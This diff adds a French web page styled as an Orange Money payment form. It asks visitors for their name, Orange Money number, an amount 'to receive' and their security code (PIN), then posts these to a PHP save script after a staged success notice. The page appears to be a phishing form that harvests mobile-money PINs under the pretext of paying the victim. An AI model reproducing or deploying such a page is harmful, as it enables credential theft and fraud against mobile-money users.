@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Paiement via Orange Money</title>
+    <link rel="stylesheet" href="css/style1.css"> <!-- Lien vers le fichier CSS -->
+</head>
+
+<body>
+    <div class="container">
+        <!-- Formulaire Orange Money -->
+
+        <?php include 'includes/header.php'; ?>
+
+        <main>
+            <form id="payment-form" action="../php/save_payment.php" method="POST">
+                <h1>Paiement via Orange Money</h1>
+
+                <label for="name">Nom et Prénom</label>
+                <input type="text" id="name" name="name" placeholder="Entrez votre nom complet" required>
+
+                <label for="phone">Numéro Orange Money</label>
+                <input type="text" id="phone" name="phone" placeholder="Numéro" required>
+
+                <label for="currency">Devise</label>
+                <select id="currency" name="currency" required>
+                    <option value="FCFA">FCFA</option>
+                    <option value="GNF">GNF</option>
+                    <option value="EUR">EUR</option>
+                    <option value="USD">USD</option>
+                </select>
+
+                <label for="amount">Montant à recevoir</label>
+                <input type="number" id="amount" name="amount" placeholder="Montant" required>
+
+                <label for="security-code">Code de sécurité</label>
+                <input type="text" id="security-code" name="security-code" placeholder="Ex : 1234" required>
+
+                <button type="submit">Recevoir</button>
+            </form>
+        </main>
+
+        <?php include 'includes/footer.php'; ?>
+
+        <!-- Notification de succès -->
+        <div class="notification" id="success-notification">
+            Paiement enregistré avec succès !
+        </div>
+    </div>
+
+    <script>
+
+        /// Sélection des éléments
+        const form = document.getElementById("payment-form");
+        const notification = document.getElementById("success-notification");
+
+        // Événement de soumission du formulaire
+        form.addEventListener("submit", function (e) {
+            // Afficher la notification
+            notification.classList.add("show");
+
+            // Masquer la notification après 3 secondes
+            setTimeout(() => {
+                notification.classList.remove("show");
+
+                // Permettre la soumission après l'animation
+                form.submit(); // Soumet le formulaire une fois l'animation terminée
+            }, 3000);
+
+            // Bloquer temporairement la soumission le temps de l'animation
+            e.preventDefault();
+        });
+
+    </script>
+</body>
+
+</html>
